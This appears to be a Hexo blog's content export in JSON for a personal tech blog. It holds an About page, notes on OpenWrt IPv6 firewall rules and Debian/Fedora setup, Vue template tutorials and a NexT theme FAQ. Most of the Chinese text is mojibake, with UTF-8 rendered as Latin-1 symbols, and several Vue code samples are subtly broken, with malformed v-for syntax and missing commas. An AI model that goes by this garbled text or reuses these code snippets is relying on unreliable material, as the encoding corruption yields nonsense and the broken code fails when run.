{"meta":{"title":"frozenfish'blog","subtitle":"","description":"","author":"frozenfish","url":"http://example.com","root":"/"},"pages":[{"title":"About","date":"2023-08-07T16:15:39.000Z","updated":"2024-01-28T09:34:30.328Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"[TOC] ä¸­æ–‡:å…³äºåšå®¢1æœ¬åšå®¢ä»…ç”¨æ¥è®°å½•åˆ†äº«æŠ€æœ¯ å…³äºæˆ‘1234ä¸–ç•Œå˜åŒ–å¤ªå¿«ã€‚ä¸€ä¸ªé˜¶çº§å¾—åˆ°åˆ©ç›Šã€‚å¦ä¸€ä¸ªé˜¶çº§å¤±å»åˆ©ç›Šï¼Œæˆ‘å°±æ˜¯é‚£å¤±å»åˆ©ç›Šçš„ä¸€éƒ¨åˆ†äººã€‚ä¸ªäººåŠ›é‡å®åœ¨å¤ªå°äº†ã€‚æˆ‘æ²¡æ³•æ”¹å˜ä»»ä½•äº‹æƒ…ã€‚æˆ‘åªèƒ½åšåˆ°ä¸æ–­å˜å¾—æœ‰ä»·å€¼è®©è‡ªå·±æœ‰æƒåˆ©é€‰æ‹©æƒ³è¦çš„ç¯å¢ƒå’Œç”Ÿæ´»ã€‚æ‰€ä»¥æˆ‘ä¸å»èŠ±æ—¶é—´åœ¨æŠ±æ€¨ç¤¾ä¼šä¸Šé¢æˆ–è€…åƒè¿‡å»ä¸€å¹´æˆ‘å­¦ä¹ å“²å­¦ï¼Œé©¬å…‹æ€æ€æƒ³ï¼Œäº†è§£å†å²ã€‚éƒéƒå¯¡æ¬¢è¿™äº‹æ—©åœ¨è¿‡å»æˆ‘å°±åšè¿‡äº†ã€‚å»äº†è§£ç¤¾ä¼šçœŸç›¸è¿™ä»¶äº‹æˆ‘æ—©å°±åšè¿‡äº†ã€‚ç°åœ¨æˆ‘éœ€è¦åšçš„æ˜¯é€‰æ‹©ç”Ÿæ´»ï¼æˆ‘æ°¸è¿œä¸ä¼šå¿˜è®°æˆ‘æ‰€ç»å†çš„ä¸€åˆ‡ï¼Œæˆ‘æ°¸è¿œæ˜¯ä¸€ä¸ªæ— äº§é˜¶çº§ï¼Œæ— è®ºå°†æ¥åœ¨ä»€ä¹ˆåœ°æ–¹ã€‚æˆ‘æŠŠå¼€æºå½“ä½œä¿¡ä»°ï¼Œå°±å½“æ˜¯æˆ‘å¯¹é©¬å…‹æ€äº‹ä¸šèƒ½åšåˆ°ä¸ºæ•°ä¸å¤šçš„äº‹æƒ…å’Œå¯¹å®ƒä¸ºæ•°ä¸å¤šçš„ç²¾ç¥å¯„æ‰˜å§ï¼çƒ­çˆ±æŠ€æœ¯ï¼Œçƒ­çˆ±ç”Ÿæ´»ï¼Œçƒ­çˆ±ç”Ÿå‘½ï¼ç°å®å’Œç½‘ç»œè¦ä¸€æ ·ç²¾å½© Eglishï¼šAbout blog1This blog is only for documenting and sharing programming skills About me1234The world is changing too fast. One class gains. Another class loses, and I&#x27;m part of that loss. I&#x27;m part of that losing class. I can&#x27;t change anything. I can only do what I can to keep on becoming valuable so that I can have the right to choose the environment and life that I want. So I don&#x27;t spend my time complaining about society or studying philosophy, Marxian thought, and learning about history like I have been doing for the past year. I&#x27;ve done this in the past by being depressed. I&#x27;ve done this long ago to learn the truth about society. Now all I need to do is choose life! I will never forget what I have been through and I will always be a proletarian, wherever that may be in the future. I take open source as a religion, consider it one of the few things I can do for the Marxian cause and one of the few spiritual attachments I have to it! Love technology, love life, love life! Reality and the internet have to be just as exciting"},{"title":"æ–‡ç« å½’æ¡£","date":"2023-12-01T13:26:05.298Z","updated":"2023-12-01T13:26:05.298Z","comments":true,"path":"archives.html","permalink":"http://example.com/archives.html","excerpt":"","text":""},{"title":"categories","date":"2024-01-10T07:21:32.000Z","updated":"2024-01-23T15:30:59.064Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"./classify/","date":"2023-08-07T16:12:22.000Z","updated":"2023-08-07T16:14:26.769Z","comments":true,"path":"classify/index.html","permalink":"http://example.com/classify/index.html","excerpt":"","text":"ç¼–ç¨‹ç”Ÿæ´»éšè®°"},{"title":"tags","date":"2024-01-10T07:07:05.000Z","updated":"2024-01-23T15:59:39.332Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"tool","date":"2024-01-28T09:58:16.000Z","updated":"2024-01-28T09:59:58.222Z","comments":true,"path":"tool/index.html","permalink":"http://example.com/tool/index.html","excerpt":"","text":"categories: linux webå®‰å…¨ ç¼–è¯‘ è‹±è¯­ ç½‘ç»œ æ•°æ®ç»“æ„ä¸ç®—æ³•"},{"title":"bug","date":"2024-01-29T21:36:59.000Z","updated":"2024-01-29T22:04:13.477Z","comments":true,"path":"bug/index.html","permalink":"http://example.com/bug/index.html","excerpt":"","text":"[TOC] bugæœåŠ¡å™¨ï¼š2024.1.29ï¼šé˜²ç«å¢™1234567891011121314151617openwrtä¹‹å‰çš„æ—¶å€™è‡ªåŠ¨æŒ‚è½½å‡ºäº†é—®é¢˜ï¼Œäºæ˜¯é‡æ–°å§uç›˜é‡Œçš„ç³»ç»Ÿè¿›è¡Œé‡è£…å¹¶å¯¼å…¥ä¹‹å‰çš„å¤‡ä»½ã€‚ä½†æ˜¯é˜²ç«å¢™è§„åˆ™ä¸åœ¨å†…ï¼Œäºæ˜¯åˆæ˜¯ç»å…¸ipv6é˜²ç«å¢™é—®é¢˜ï¼šé˜²ç«å¢™wanâ€”â€”&gt; ï¼šå¯ä»¥éƒ½ä¸æ”¾è¡Œé˜²ç«å¢™è§„åˆ™é‚£é‡Œæ˜¯ä¼˜å…ˆäºè¿™ä¸ªè§„åˆ™çš„openwrté»˜è®¤æ˜¯ipv4ç›®æ ‡åŒºåŸŸï¼šå¦‚æœä½ çš„æƒ³ç»™è·¯ç”±å™¨å¼€æ”¾å¤–ç½‘è®¿é—®ï¼Œé‚£ä¹ˆå°±ç›®æ ‡åŒºåŸŸä¿æŒé»˜è®¤ï¼Œå¦‚æœæƒ³ç»™è·¯ç”±å™¨ä¸‹çš„å…¶ä»–è®¾å¤‡æ¯”å¦‚NASã€æœåŠ¡å™¨ç­‰å¼€æ”¾é˜²ç«å¢™å°±é€‰æ‹©lanã€‚ç›®æ ‡åœ°å€ï¼šä»»æ„å°±æ˜¯æ‰€æœ‰çš„è®¾å¤‡å‡å¯è¢«å¤–ç½‘è®¿é—®ï¼Œå»ºè®®å•ç‹¬è®¾ç½®ï¼Œä¸è¿‡é»˜è®¤çš„ä¸€èˆ¬åªæ”¯æŒipv4ï¼Œè¿™æ—¶éœ€è¦é€‰æ‹©è‡ªå®šä¹‰ã€‚æœ‰ä¸¤ç§å¡«å†™æ–¹å¼ï¼Œéƒ½æ˜¯å¡«å†™ipv6çš„åå››æ®µã€‚å‡éœ€è¦åœ¨æœ«å°¾åŠ å…¥&quot;::ffff:ffff:ffff:ffff&quot; å¦‚::1234:abcd:abcd:abcd/::ffff:ffff:ffff:ffff æˆ–è€… ::b64/::ffff:ffff:ffff:ffffæˆ–è€…2408::/16 or 2408::/64å‰ç¼€ä¸ºè¿è¥å•†ã€‚è¿™æ˜¯è”é€šçš„ã€‚ç”µä¿¡ç§»åŠ¨å‰ç¼€åˆ™ä¸åŒä¸Šæ­¤æ˜¯2408/::ffff:ffff:ffff:ffffå¯ä»¥ä¸Šä¸Šæ¬¡æ˜¯2408::/64è¿™æ¬¡åˆ™æ˜¯2408::/16æˆ‘çš„ipv6ä»æ¥æ²¡å˜è¿‡ï¼Œç›®å‰ä¸çŸ¥é“æ€ä¹ˆäº§ç”Ÿçš„å¦‚ä¸Šé—®é¢˜ 2024.1.29ï¼šé…ç½®æ°¸ä¹…å˜é‡123456debianæ²¡æœ‰ifconfigå‘½ä»¤ï¼Œå®‰è£…ååœ¨/sbin/ç›®å½•ä¸‹ã€‚ä½†æ˜¯ç¯å¢ƒå˜é‡ä¸­æ²¡æœ‰äºæ˜¯é…ç½®vim /etc/environmentåŠ å…¥å¦‚ä¸‹: PATH=$PATH:/sbinç„¶ååŠ è½½ source /etc/environment Linux2024.1.30ï¼šå®‰è£…fedora 123456789101112131415161.ä½¿ç”¨ä»–ä»¬è‡ªå¸¦çš„fedora media writerå‡ºç°å¦‚ä¸‹æŠ¥é”™fedora failed to start chekisomd5 after this the installation does not go any further and ihave to resetæŠ¥é”™ä½¿ç”¨rufuså†™å…¥å·¥å…·åæ­£å¸¸åŸå¸¦æœ‰gnomeæ¡Œé¢ç¯å¢ƒã€‚åæ¥ä½¿ç”¨kdeæ›´æ¢è„šæœ¬ï¼Œå‘ç°æ— æ³•æˆåŠŸã€‚æˆ‘è‡ªå·±è¿›è¡Œå®‰è£…kdeçš„sddmã€‚åæ¥å¯åŠ¨æˆåŠŸã€‚ä½†æ˜¯å‡ºç°å¡é¡¿æƒ…å†µäºæ˜¯å®‰è£…é©±åŠ¨ã€‚çœ‹åˆ°çŸ¥ä¹æœ‰äººè¯´ç”¨ä»–è‡ªå¸¦çš„åŒ…å°±å¥½ï¼Œ/sbin/lspci |grep -e VGA #æ˜¾å¡å‹å·sudo dnf update -ysudo dnf install akmod-nvidiasudo dnf install xorg-x11-drv-nvidia-cudaè½¬è½½è‡ªrpmfusion.org/Howto/NVIDIAåå†™å…¥kdeç‰ˆæœ¬å‡ºç°ä¸€ç‰‡ç©ºç™½æ— å“åº”çš„æƒ…å†µã€‚æˆ‘äºæ˜¯åªèƒ½åœ¨åŸæœ‰åŸºç¡€ä¸Šå»æ›´æ”¹æˆkdeè€Œä¸æ˜¯ problemwebå®‰å…¨ 2023&#x2F;12&#x2F;16 fuckcdnåŸç†ï¼Œå…¨ç½‘æ‰«æcdnã€‚å“ªå¤©æœ‰æ—¶é—´å¯ä»¥ç ”ç©¶ä¸€ä¸‹ï¼Œå…¨ç½‘cdnæ‰«æçš„æºç ã€‚fuckcdnçš„æ„è¯­è¨€æˆ‘æ²¡å­¦è¿‡ï¼Œæ‰¾ä¸ªcçš„ç ”ç©¶ï¼Œã€‚æˆ–è€…å»youtubeæˆ–è°·æ­Œæ‰¾ç›¸å…³æŠ€æœ¯æ–‡ç« ã€‚å›½å†…æ²¡æœ‰è¯¦ç»†çš„è®²è§£"}],"posts":[{"title":"vue","slug":"vue","date":"2024-02-19T05:50:07.000Z","updated":"2024-02-20T10:57:03.298Z","comments":true,"path":"2024/02/19/vue/","link":"","permalink":"http://example.com/2024/02/19/vue/","excerpt":"","text":"[TOC] vueä¸¤ç§è¯­æ³•é£æ ¼é€‰é¡¹å¼1234567891011121314151617181920212223242526272829&lt;script&gt;export default &#123; // data() è¿”å›çš„å±æ€§å°†ä¼šæˆä¸ºå“åº”å¼çš„çŠ¶æ€ // å¹¶ä¸”æš´éœ²åœ¨ `this` ä¸Š data() &#123; return &#123; count: 0 &#125; &#125;, // methods æ˜¯ä¸€äº›ç”¨æ¥æ›´æ”¹çŠ¶æ€ä¸è§¦å‘æ›´æ–°çš„å‡½æ•° // å®ƒä»¬å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½œä¸ºäº‹ä»¶å¤„ç†å™¨ç»‘å®š methods: &#123; increment() &#123; this.count++ &#125; &#125;, // ç”Ÿå‘½å‘¨æœŸé’©å­ä¼šåœ¨ç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„å„ä¸ªä¸åŒé˜¶æ®µè¢«è°ƒç”¨ // ä¾‹å¦‚è¿™ä¸ªå‡½æ•°å°±ä¼šåœ¨ç»„ä»¶æŒ‚è½½å®Œæˆåè¢«è°ƒç”¨ mounted() &#123; console.log(`The initial count is $&#123;this.count&#125;.`) &#125;&#125;&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt; ç»„åˆå¼1234567891011121314151617181920&lt;script setup&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;// å“åº”å¼çŠ¶æ€const count = ref(0)// ç”¨æ¥ä¿®æ”¹çŠ¶æ€ã€è§¦å‘æ›´æ–°çš„å‡½æ•°function increment() &#123; count.value++&#125;// ç”Ÿå‘½å‘¨æœŸé’©å­onMounted(() =&gt; &#123; console.log(`The initial count is $&#123;count.value&#125;.`)&#125;)&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt; vue2.0å°å­¦ä¸€æ‰‹æ¨¡æ¿æ’å€¼12345678910111213&lt;template&gt;&lt;div&gt;&#123;&#123; msg &#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default&#123; data()&#123; return&#123; msg:&quot;hhh&quot; &#125; &#125; &#125;&lt;/script&gt; å±æ€§ç»‘å®šClass ä¸ Style ç»‘å®š | Vue.js (vuejs.org)12345678910111213141516171819202122&lt;template&gt;&lt;div v-bind:id=&quot;testid&quot; v-bind:class=&quot;msg&quot;&gt;æµ‹è¯•&lt;/div&gt;&lt;div :class=&quot;test&quot;&gt;æµ‹è¯•&lt;/div&gt;//æ–¹æ³•2ï¼šç›´æ¥:è·Ÿå±æ€§å¯ä»¥//å¤šå±æ€§ç»‘å®š&lt;div v-bind=&quot;object&quot;&gt;å¤šå±æ€§æµ‹è¯•&lt;/div&gt;&lt;template&gt; &lt;script&gt; export default&#123; data()&#123; return&#123; msg:&quot;active&quot; testid:&quot;appid&quot; boolend:false, hh:undefined //ç»‘å®šå¤šä¸ª object:&#123; id: &quot;hi&quot; class: &quot;top&quot; &#125; &#125; &#125; &#125; &lt;/script&gt; æ¡ä»¶æ¸²æŸ“12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;template&gt;&lt;div v-if=&quot;if&quot;&gt;æµ‹è¯•1&lt;/div&gt;&lt;!--v-if æŒ‡ä»¤ç”¨äºæ¡ä»¶æ€§åœ°æ¸²æŸ“ä¸€å—å†…å®¹ã€‚è¿™å—å†…å®¹åªä¼šåœ¨æŒ‡ä»¤çš„è¡¨è¾¾å¼è¿”å›çœŸå€¼æ—¶æ‰è¢«æ¸²æŸ“ã€‚--&gt;&lt;h1 v-else&gt;Oh no ğŸ˜¢&lt;/h1&gt;&lt;!----&gt;//v-else-if&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A&lt;/div&gt;&lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B&lt;/div&gt;&lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C&lt;/div&gt;&lt;div v-else&gt; Not A/B/C&lt;/div&gt;&lt;template&gt; ä¸Šçš„ v-ifâ€‹å› ä¸º v-if æ˜¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œä»–å¿…é¡»ä¾é™„äºæŸä¸ªå…ƒç´ ã€‚ä½†å¦‚æœæˆ‘ä»¬æƒ³è¦åˆ‡æ¢ä¸æ­¢ä¸€ä¸ªå…ƒç´ å‘¢ï¼Ÿåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ª &lt;template&gt; å…ƒç´ ä¸Šä½¿ç”¨ v-ifï¼Œè¿™åªæ˜¯ä¸€ä¸ªä¸å¯è§çš„åŒ…è£…å™¨å…ƒç´ ï¼Œæœ€åæ¸²æŸ“çš„ç»“æœå¹¶ä¸ä¼šåŒ…å«è¿™ä¸ª &lt;template&gt; å…ƒç´ ã€‚&lt;template v-if=&quot;ok&quot;&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;Paragraph 1&lt;/p&gt; &lt;p&gt;Paragraph 2&lt;/p&gt;&lt;/template&gt;v-showâ€‹å¦ä¸€ä¸ªå¯ä»¥ç”¨æ¥æŒ‰æ¡ä»¶æ˜¾ç¤ºä¸€ä¸ªå…ƒç´ çš„æŒ‡ä»¤æ˜¯ v-showã€‚å…¶ç”¨æ³•åŸºæœ¬ä¸€æ ·ï¼š&lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt;ä¸åŒä¹‹å¤„åœ¨äº v-show ä¼šåœ¨ DOM æ¸²æŸ“ä¸­ä¿ç•™è¯¥å…ƒç´ ï¼›v-show ä»…åˆ‡æ¢äº†è¯¥å…ƒç´ ä¸Šåä¸º display çš„ CSS å±æ€§ã€‚v-show ä¸æ”¯æŒåœ¨ &lt;template&gt; å…ƒç´ ä¸Šä½¿ç”¨ï¼Œä¹Ÿä¸èƒ½å’Œ v-else æ­é…ä½¿ç”¨ã€‚&lt;/template&gt;&lt;script&gt; export default&#123; data()&#123; return&#123; if: true, type: c,//v-else-if ok: true //v-show &#125; &#125; &#125;&lt;/script&gt; v-if vs. v-showv-if æ˜¯â€œçœŸå®çš„â€æŒ‰æ¡ä»¶æ¸²æŸ“ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†åœ¨åˆ‡æ¢æ—¶ï¼Œæ¡ä»¶åŒºå—å†…çš„äº‹ä»¶ç›‘å¬å™¨å’Œå­ç»„ä»¶éƒ½ä¼šè¢«é”€æ¯ä¸é‡å»ºã€‚ v-if ä¹Ÿæ˜¯æƒ°æ€§çš„ï¼šå¦‚æœåœ¨åˆæ¬¡æ¸²æŸ“æ—¶æ¡ä»¶å€¼ä¸º falseï¼Œåˆ™ä¸ä¼šåšä»»ä½•äº‹ã€‚æ¡ä»¶åŒºå—åªæœ‰å½“æ¡ä»¶é¦–æ¬¡å˜ä¸º true æ—¶æ‰è¢«æ¸²æŸ“ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œv-show ç®€å•è®¸å¤šï¼Œå…ƒç´ æ— è®ºåˆå§‹æ¡ä»¶å¦‚ä½•ï¼Œå§‹ç»ˆä¼šè¢«æ¸²æŸ“ï¼Œåªæœ‰ CSS display å±æ€§ä¼šè¢«åˆ‡æ¢ã€‚ æ€»çš„æ¥è¯´ï¼Œv-if æœ‰æ›´é«˜çš„åˆ‡æ¢å¼€é”€ï¼Œè€Œ v-show æœ‰æ›´é«˜çš„åˆå§‹æ¸²æŸ“å¼€é”€ã€‚å› æ­¤ï¼Œå¦‚æœéœ€è¦é¢‘ç¹åˆ‡æ¢ï¼Œåˆ™ä½¿ç”¨ v-show è¾ƒå¥½ï¼›å¦‚æœåœ¨è¿è¡Œæ—¶ç»‘å®šæ¡ä»¶å¾ˆå°‘æ”¹å˜ï¼Œåˆ™ v-if ä¼šæ›´åˆé€‚ã€‚ åˆ—è¡¨æ¸²æŸ“v-foræˆ‘ä»¬å¯ä»¥ä½¿ç”¨ v-for æŒ‡ä»¤åŸºäºä¸€ä¸ªæ•°ç»„æ¥æ¸²æŸ“ä¸€ä¸ªåˆ—è¡¨ã€‚v-for æŒ‡ä»¤çš„å€¼éœ€è¦ä½¿ç”¨ item in items å½¢å¼çš„ç‰¹æ®Šè¯­æ³•ï¼Œå…¶ä¸­ items æ˜¯æºæ•°æ®çš„æ•°ç»„ï¼Œè€Œ item æ˜¯è¿­ä»£é¡¹çš„åˆ«åï¼š 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt;&lt;div v-for:&quot;name in names&quot;&gt;&#123;&#123; name &#125;&#125;&lt;/div&gt;&lt;div v-for:&quot;item in result&quot;&gt; &lt;p&gt;&#123;&#123;&gt;&#123;&#123; item.title &#125;&#125;&lt;/p&gt; &lt;img :src=&quot;item.avator&quot;&gt; &lt;/div&gt;//æ”¯æŒæŒ‰ä¸‹æ ‡æ˜¾ç¤º&lt;div v-for:&quot;(item,index) in result&quot;&gt;&#123;&#123; item.title &#125;&#125; - &#123;&#123; index &#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default&#123; data()&#123; return&#123; names:[&quot;test1&quot;,&quot;hello&quot;,&quot;å‰ç«¯&quot;] result:[ &#123; &quot;id&quot;:222454, &quot;title&quot;: &quot;å®¶é‡Œæœ‰ä¸¤å¥—æˆ¿çš„å¥³ç”Ÿï¼Œåœ¨ç›¸äº²å¸‚åœºä¸­æ¡ä»¶ç®—ä¼˜è¶Šå—ï¼Ÿ&quot; &quot;avator&quot;: &quot;https://image.baidu.com/search/detail?ct=503316480&amp;z=undefined&amp;tn=&quot; &#125;ï¼Œ &#123; &quot;id&quot;:132131, &quot;title&quot;: &quot;å¹¿å·ä¸€å¥—ï¼Œä½›å±±ä¸€å¥—ï¼Œä½“é‡åœ¨110-130ä¹‹é—´æµ®åŠ¨ï¼Œèº«é«˜160&quot; &quot;avator&quot;: &quot;https://image.baidu.com/search/detail?ct=503316480&amp;z=undefined&amp;tn=&quot; &#125;ï¼Œ &#123; &quot;id&quot;:1231313, &quot;title&quot;: &quot;å…¶å®ƒæ¡ä»¶å‘¢ï¼Œå…‰çœ‹è¿™ä¸ªçš„è¯å‘ä¸‹å…¼å®¹æ˜¯ä¼˜è¶Šçš„0&quot; &quot;avator&quot;:&quot;https://image.baidu.com/search/detailct=503316480&amp;z=undefined&amp;tn=&quot; &#125; ] &#125; &#125; &#125;&lt;/script&gt; 1&lt;template&gt;&lt;/template&gt; keyé€šè¿‡ key ç®¡ç†çŠ¶æ€ Vue é»˜è®¤æŒ‰ç…§â€œå°±åœ°æ›´æ–°â€çš„ç­–ç•¥æ¥æ›´æ–°é€šè¿‡ v-for æ¸²æŸ“çš„å…ƒç´ åˆ—è¡¨ã€‚å½“æ•°æ®é¡¹çš„é¡ºåºæ”¹å˜æ—¶ï¼ŒVue ä¸ä¼šéšä¹‹ç§»åŠ¨ DOM å…ƒç´ çš„é¡ºåºï¼Œè€Œæ˜¯å°±åœ°æ›´æ–°æ¯ä¸ªå…ƒç´ ï¼Œç¡®ä¿å®ƒä»¬åœ¨åŸæœ¬æŒ‡å®šçš„ç´¢å¼•ä½ç½®ä¸Šæ¸²æŸ“ã€‚ é»˜è®¤æ¨¡å¼æ˜¯é«˜æ•ˆçš„ï¼Œä½†åªé€‚ç”¨äºåˆ—è¡¨æ¸²æŸ“è¾“å‡ºçš„ç»“æœä¸ä¾èµ–å­ç»„ä»¶çŠ¶æ€æˆ–è€…ä¸´æ—¶ DOM çŠ¶æ€ (ä¾‹å¦‚è¡¨å•è¾“å…¥å€¼) çš„æƒ…å†µã€‚ ä¸ºäº†ç»™ Vue ä¸€ä¸ªæç¤ºï¼Œä»¥ä¾¿å®ƒå¯ä»¥è·Ÿè¸ªæ¯ä¸ªèŠ‚ç‚¹çš„æ ‡è¯†ï¼Œä»è€Œé‡ç”¨å’Œé‡æ–°æ’åºç°æœ‰çš„å…ƒç´ ï¼Œä½ éœ€è¦ä¸ºæ¯ä¸ªå…ƒç´ å¯¹åº”çš„å—æä¾›ä¸€ä¸ªå”¯ä¸€çš„ key attributeï¼š 123&lt;div v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt; &lt;!-- å†…å®¹ --&gt;&lt;/div&gt; å½“ä½ ä½¿ç”¨ &lt;template v-for&gt; æ—¶ï¼Œkey åº”è¯¥è¢«æ”¾ç½®åœ¨è¿™ä¸ª &lt;template&gt; å®¹å™¨ä¸Šï¼š 123&lt;template v-for=&quot;todo in todos&quot; :key=&quot;todo.name&quot;&gt; &lt;li&gt;&#123;&#123; todo.name &#125;&#125;&lt;/li&gt;&lt;/template&gt; æ¨èåœ¨ä»»ä½•å¯è¡Œçš„æ—¶å€™ä¸º v-for æä¾›ä¸€ä¸ª key attributeï¼Œé™¤éæ‰€è¿­ä»£çš„ DOM å†…å®¹éå¸¸ç®€å• (ä¾‹å¦‚ï¼šä¸åŒ…å«ç»„ä»¶æˆ–æœ‰çŠ¶æ€çš„ DOM å…ƒç´ )ï¼Œæˆ–è€…ä½ æƒ³æœ‰æ„é‡‡ç”¨é»˜è®¤è¡Œä¸ºæ¥æé«˜æ€§èƒ½ã€‚ key ç»‘å®šçš„å€¼æœŸæœ›æ˜¯ä¸€ä¸ªåŸºç¡€ç±»å‹çš„å€¼ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²æˆ– number ç±»å‹ã€‚ä¸è¦ç”¨å¯¹è±¡ä½œä¸º v-for çš„ keyã€‚å…³äº key attribute çš„æ›´å¤šç”¨é€”ç»†èŠ‚ï¼Œè¯·å‚é˜… key API æ–‡æ¡£ã€‚ äº‹ä»¶å¤„ç†å†…è”äº‹ä»¶å¤„ç†å™¨å†…è”äº‹ä»¶å¤„ç†å™¨é€šå¸¸ç”¨äºç®€å•åœºæ™¯ï¼Œä¾‹å¦‚ï¼š 1const count = ref(0) 12&lt;button @click=&quot;count++&quot;&gt;Add 1&lt;/button&gt;&lt;p&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/p&gt; æ–¹æ³•äº‹ä»¶å¤„ç†å™¨éšç€äº‹ä»¶å¤„ç†å™¨çš„é€»è¾‘å˜å¾—æ„ˆå‘å¤æ‚ï¼Œå†…è”ä»£ç æ–¹å¼å˜å¾—ä¸å¤Ÿçµæ´»ã€‚å› æ­¤ v-on ä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªæ–¹æ³•åæˆ–å¯¹æŸä¸ªæ–¹æ³•çš„è°ƒç”¨ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼š 123456789const name = ref(&#x27;Vue.js&#x27;)function greet(event) &#123; alert(`Hello $&#123;name.value&#125;!`) // `event` æ˜¯ DOM åŸç”Ÿäº‹ä»¶ if (event) &#123; alert(event.target.tagName) &#125;&#125; 12&lt;!-- `greet` æ˜¯ä¸Šé¢å®šä¹‰è¿‡çš„æ–¹æ³•å --&gt;&lt;button @click=&quot;greet&quot;&gt;Greet&lt;/button&gt;","categories":[],"tags":[]},{"title":"Nextä¸»é¢˜ä½¿ç”¨","slug":"Nextä¸»é¢˜ä½¿ç”¨","date":"2024-01-23T15:08:48.000Z","updated":"2024-01-23T15:56:55.039Z","comments":true,"path":"2024/01/23/Nextä¸»é¢˜ä½¿ç”¨/","link":"","permalink":"http://example.com/2024/01/23/Next%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8/","excerpt":"","text":"è¿™é‡Œç½—åˆ—çš„æ˜¯ NexT Issues ä¸­ç”¨æˆ·æé—®æœ€é¢‘ç¹çš„é—®é¢˜ã€‚è‹¥ä½ åœ¨è¿™é‡Œæ— æ³•æ‰¾åˆ°é—®é¢˜çš„ç­”æ¡ˆï¼Œ è¯·è®¿é—® NexT Issuesï¼Œ æäº¤ä½ çš„é—®é¢˜ã€‚ å¦‚ä½•è®¾ç½®ã€Œé˜…è¯»å…¨æ–‡ã€ï¼Ÿåœ¨é¦–é¡µæ˜¾ç¤ºä¸€ç¯‡æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ï¼Œå¹¶æä¾›ä¸€ä¸ªé“¾æ¥è·³è½¬åˆ°å…¨æ–‡é¡µé¢æ˜¯ä¸€ä¸ªå¸¸è§çš„éœ€æ±‚ã€‚ NexT æä¾›ä¸‰ç§æ–¹å¼æ¥æ§åˆ¶æ–‡ç« åœ¨é¦–é¡µçš„æ˜¾ç¤ºæ–¹å¼ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨é¦–é¡µæ˜¾ç¤ºæ–‡ç« çš„æ‘˜å½•å¹¶æ˜¾ç¤º é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ï¼š åœ¨æ–‡ç« ä¸­ä½¿ç”¨ &lt;!-- more --&gt; æ‰‹åŠ¨è¿›è¡Œæˆªæ–­ï¼ŒHexo æä¾›çš„æ–¹å¼ æ¨è åœ¨æ–‡ç« çš„ front-matter ä¸­æ·»åŠ  descriptionï¼Œå¹¶æä¾›æ–‡ç« æ‘˜å½• è‡ªåŠ¨å½¢æˆæ‘˜è¦ï¼Œåœ¨ ä¸»é¢˜é…ç½®æ–‡ä»¶ ä¸­æ·»åŠ ï¼š 123auto_excerpt: enable: true length: 150 é»˜è®¤æˆªå–çš„é•¿åº¦ä¸º 150 å­—ç¬¦ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œè®¾å®š å»ºè®®ä½¿ç”¨ &lt;!-- more --&gt;ï¼ˆå³ç¬¬ä¸€ç§æ–¹å¼ï¼‰ï¼Œé™¤äº†å¯ä»¥ç²¾ç¡®æ§åˆ¶éœ€è¦æ˜¾ç¤ºçš„æ‘˜å½•å†…å®¹ä»¥å¤–ï¼Œ è¿™ç§æ–¹å¼ä¹Ÿå¯ä»¥è®© Hexo ä¸­çš„æ’ä»¶æ›´å¥½çš„è¯†åˆ«ã€‚ Favicon è®¾ç½®åæ²¡æœ‰ç”Ÿæ•ˆï¼Ÿå°†ä½ çš„ favicon æ”¾ç½®åˆ° ç«™ç‚¹ çš„ source ç›®å½•ä¸‹ï¼Œä¸ç«™ç‚¹çš„é…ç½®æ–‡ä»¶åŒçº§ã€‚ è‹¥ä½ å‘ç°è®¾ç½®çš„ Favicon å¹¶æœªç”Ÿæ•ˆï¼Œè¯·å…ˆæ¸…é™¤æµè§ˆå™¨çš„ç¼“å­˜åç›´æ¥è®¿é—® Favicon çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€é€šå¸¸æ˜¯ http://your-domain.com/favicon.icoã€‚ å¦‚æœä½ çš„ç«™ç‚¹æ˜¯æ”¾åœ¨å­ç›®å½•ä¸‹ï¼Œè¯·è®¾ç½®ä¸ºï¼šfavicon: favicon.ico å¦‚ä½•æ›´æ”¹å­—ä½“ï¼ŸNexT ä» 5.0.1 ç‰ˆæœ¬å¼€å§‹æä¾›ä¸€ä¸ª å­—ä½“å®šåˆ¶ç‰¹æ€§ï¼Œ è¯·å…ˆæŸ¥çœ‹æ­¤ç‰¹æ€§æ˜¯å¦èƒ½æ»¡è¶³ä½ 